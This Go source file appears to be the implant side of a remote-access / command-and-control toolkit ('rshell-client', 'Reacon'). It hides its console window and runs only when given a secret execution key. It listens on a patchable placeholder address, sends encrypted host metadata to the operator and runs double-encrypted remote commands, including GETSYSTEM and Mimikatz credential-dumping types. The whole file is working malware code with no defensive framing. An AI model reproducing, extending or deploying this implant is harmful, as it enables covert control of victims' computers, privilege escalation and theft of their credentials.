// tcp_listener.go
package main

import (
	"Reacon/pkg/communication"
	"rshell-client/shared/config"
	"rshell-client/shared/encrypt"
	"rshell-client/shared/link"
	"rshell-client/shared/services"
	"rshell-client/shared/utils"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

func init() {
	link.ReportError = communication.ErrorProcess
	link.ReportData = communication.DataProcess
}

// TCPListener 结构体，替代原有的WebSocket Listener
type TCPListener struct {
	Clients     map[string]*TCPClient
	ClientsMu   sync.RWMutex
	IsRunning   bool
	stopChan    chan struct{}
	keepAlive   *time.Ticker
	listener    net.Listener
	CurrentConn net.Conn // 当前活跃连接（保留用于兼容性）
}

// TCPClient TCP客户端结构
type TCPClient struct {
	Conn          net.Conn
	RemoteAddr    string
	UID           string
	LastHeartbeat time.Time
	IsClosed      bool
	Reader        *bufio.Reader // TCP缓冲读取器
}

// RunTCPListener 启动TCP监听器
func RunTCPListener(listenAddr string) {
	listener := &TCPListener{
		Clients:  make(map[string]*TCPClient),
		stopChan: make(chan struct{}),
	}
	listener.Start(listenAddr)
}

func (tl *TCPListener) Start(listenAddr string) {
	var err error
	tl.listener, err = net.Listen("tcp", listenAddr)
	if err != nil {
		return
	}

	tl.IsRunning = true

	tl.keepAlive = time.NewTicker(20 * time.Second)
	go tl.heartbeatLoop()

	go tl.acceptConnections()

	<-tl.stopChan
	tl.IsRunning = false
	tl.keepAlive.Stop()
	tl.listener.Close()
	tl.closeAllConnections()
}

func (tl *TCPListener) acceptConnections() {
	for tl.IsRunning {
		conn, err := tl.listener.Accept()
		if err != nil {
			if tl.IsRunning {
			}
			continue
		}
		go tl.handleConnection(conn)
	}
}

func (tl *TCPListener) handleConnection(conn net.Conn) {
	// 检查是否已有活跃连接
	tl.ClientsMu.RLock()
	hasActiveConnection := false
	for _, client := range tl.Clients {
		if !client.IsClosed {
			hasActiveConnection = true
			break
		}
	}
	tl.ClientsMu.RUnlock()

	if hasActiveConnection {
		conn.Close()
		return
	}

	remoteAddr := conn.RemoteAddr().String()
	client := &TCPClient{
		Conn:          conn,
		RemoteAddr:    remoteAddr,
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReaderSize(conn, 1024*1024), // 1MB缓冲区
	}

	// 生成临时ID
	tempID := fmt.Sprintf("tcp_%s_%d", remoteAddr, time.Now().UnixNano())
	client.UID = tempID

	// 添加到客户端列表
	tl.ClientsMu.Lock()
	tl.Clients[tempID] = client
	tl.CurrentConn = conn
	tl.ClientsMu.Unlock()

	communication.TCPClient = &conn

	if err := tl.sendFirstBlood(conn); err != nil {
		conn.Close()
		tl.removeClient(tempID)
		return
	}

	tl.handleClientMessages(client)
}

func (tl *TCPListener) handleClientMessages(client *TCPClient) {
	defer func() {
		// 清理资源
		client.IsClosed = true
		client.Conn.Close()
		tl.removeClient(client.UID)
		fmt.Printf("TCP connection closed: %s\n", client.RemoteAddr)
	}()

	for {
		// 设置读取超时
		// client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		// TCP需要先读取消息长度（4字节）
		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err.Error() == "EOF" {
				fmt.Printf("Client closed connection: %s\n", client.RemoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Printf("TCP read timeout for: %s\n", client.RemoteAddr)
				// 检查心跳，如果没有心跳则断开
				if time.Since(client.LastHeartbeat) > 90*time.Second {
					fmt.Printf("Client %s no heartbeat for 90s, disconnecting\n", client.RemoteAddr)
					break
				}
				continue
			} else {
				fmt.Printf("Error reading message length: %v, from: %s\n", err, client.RemoteAddr)
			}
			break
		}

		// 验证消息长度
		if length == 0 {
			fmt.Printf("Received zero-length message from: %s\n", client.RemoteAddr)
			continue
		}

		// if length > 10*1024*1024 { // 限制为10MB
		// 	fmt.Printf("Message too large: %d, from: %s\n", length, client.RemoteAddr)
		// 	break
		// }

		// 读取消息内容
		message := make([]byte, length)
		_, err = io.ReadFull(client.Reader, message)
		if err != nil {
			if err.Error() == "EOF" {
				fmt.Printf("Client closed connection while reading: %s\n", client.RemoteAddr)
			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Printf("TCP read content timeout for: %s\n", client.RemoteAddr)
				continue
			} else {
				fmt.Printf("Error reading message content: %v, from: %s\n", err, client.RemoteAddr)
			}
			break
		}

		// 更新心跳时间
		client.LastHeartbeat = time.Now()

		// 处理消息
		go tl.processMessage(message, client.Conn)
	}
}

func (tl *TCPListener) sendFirstBlood(conn net.Conn) error {
	if len(utils.MetaInfo) == 0 {
		var err error
		utils.MetaInfo, err = utils.EncryptedMetaInfo()
		if err != nil {
			return err
		}
		utils.MetaInfo, err = encrypt.EncodeBase64(utils.MetaInfo)
		if err != nil {
			return err
		}
	}


	firstBloodType := make([]byte, 4)
	binary.BigEndian.PutUint32(firstBloodType, 1)

	firstBloodMsg := append(firstBloodType, utils.MetaInfo...)

	communication.Send(firstBloodMsg, conn)
	return nil
}

func (tl *TCPListener) processMessage(data []byte, conn net.Conn) {

	if len(data) < 4 {
		return
	}

	payload := data
	msgType := binary.BigEndian.Uint32(data[:4])
	if msgType == 1 || msgType == 2 || msgType == 3 {
		if len(data) >= 8 {
			metaLen := binary.BigEndian.Uint32(data[4:8])
			if len(data) >= int(8+metaLen) {
				payload = data[8+metaLen:]
			} else {
				payload = data[4:]
			}
		} else {
			payload = data[4:]
		}
	}

	decoded, err := encrypt.DecodeBase64(payload)
	if err != nil {
		return
	}

	data1, err := encrypt.Decrypt(decoded)
	if err != nil {
		return
	}

	decrypted, err := encrypt.Decrypt(data1)
	if err != nil {
		return
	}

	if len(decrypted) < 4 {
		return
	}

	cmdType := binary.BigEndian.Uint32(decrypted[:4])
	cmdBuf := decrypted[4:]

	if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
		go func(ct uint32, cb []byte) {
			tl.processDecryptedCommand(ct, cb, conn)
		}(cmdType, cmdBuf)
		return
	}

	tl.processDecryptedCommand(cmdType, cmdBuf, conn)
}

func (tl *TCPListener) processDecryptedCommand(cmdType uint32, cmdBuf []byte, conn net.Conn) {
	result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
	if cmdType == services.EXIT && err == nil {
		os.Exit(1)
	}
	if err != nil {
		tl.sendErrorResponse(err, conn)
	} else if callbackType >= 0 {
		tl.sendResponse(callbackType, result, conn)
	}

	// 发送响应
	if err != nil {
		tl.sendErrorResponse(err, conn)
	} else {
		if callbackType >= 0 {
			tl.sendResponse(callbackType, result, conn)
		}
	}
}

func (tl *TCPListener) sendResponse(responseType int, data []byte, conn net.Conn) error {
	responseTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(responseTypeBytes, uint32(responseType))

	responseData := append(responseTypeBytes, data...)

	// 加密响应（两次加密，与客户端一致）
	encrypted1, err := encrypt.Encrypt(responseData)
	if err != nil {
		return err
	}

	encrypted2, err := encrypt.Encrypt(encrypted1)
	if err != nil {
		return err
	}

	encoded, err := encrypt.EncodeBase64(encrypted2)
	if err != nil {
		return err
	}

	// 构造消息（格式与客户端一致）
	metaInfo := utils.MetaInfo
	metaLen := make([]byte, 4)
	binary.BigEndian.PutUint32(metaLen, uint32(len(metaInfo)))

	fullMsg := append(metaLen, metaInfo...)
	fullMsg = append(fullMsg, encoded...)

	msgType := uint32(2) // otherMsg
	msgTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(msgTypeBytes, msgType)

	finalMsg := append(msgTypeBytes, fullMsg...)

	// 使用communication.Send发送消息
	communication.Send(finalMsg, conn)
	return nil
}

func (tl *TCPListener) sendErrorResponse(err error, conn net.Conn) error {
	errorMsg := []byte(err.Error())
	return tl.sendResponse(31, errorMsg, conn)
}

func (tl *TCPListener) heartbeatLoop() {
	for range tl.keepAlive.C {
		tl.ClientsMu.RLock()

		for uid, client := range tl.Clients {
			if client.IsClosed {
				continue
			}

			// 检查最后活动时间
			if time.Since(client.LastHeartbeat) > 60*time.Second {
				fmt.Printf("Client %s no activity for %v, marking as inactive\n",
					uid, time.Since(client.LastHeartbeat))
				continue
			}

			// 发送类型3的心跳消息
			heartBeatType := make([]byte, 4)
			binary.BigEndian.PutUint32(heartBeatType, 3) // 心跳类型为3

			heartBeatMsg := append(heartBeatType, utils.MetaInfo...)

			// 使用communication.Send发送心跳
			communication.Send(heartBeatMsg, client.Conn)

			// client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		}

		tl.ClientsMu.RUnlock()
	}
}

func (tl *TCPListener) removeClient(uid string) {
	tl.ClientsMu.Lock()
	defer tl.ClientsMu.Unlock()

	if client, exists := tl.Clients[uid]; exists {
		client.IsClosed = true
		delete(tl.Clients, uid)

		// 更新当前活跃连接
		if tl.CurrentConn == client.Conn {
			tl.CurrentConn = nil
			// 尝试设置另一个客户端为当前连接
			for _, c := range tl.Clients {
				if !c.IsClosed {
					tl.CurrentConn = c.Conn
					break
				}
			}
		}
	}
}

func (tl *TCPListener) closeAllConnections() {
	tl.ClientsMu.Lock()
	defer tl.ClientsMu.Unlock()

	for uid, client := range tl.Clients {
		client.IsClosed = true
		client.Conn.Close()
		delete(tl.Clients, uid)
	}
	tl.CurrentConn = nil
}

func (tl *TCPListener) Stop() {
	if tl.IsRunning {
		close(tl.stopChan)
		tl.IsRunning = false
	}
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	// 隐藏控制台
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}

	// DPI感知
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}

	encrypt.GenerateKeyPair()

	listenAddr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	listenAddr = strings.ReplaceAll(listenAddr, " ", "")
	RunTCPListener(listenAddr)
}
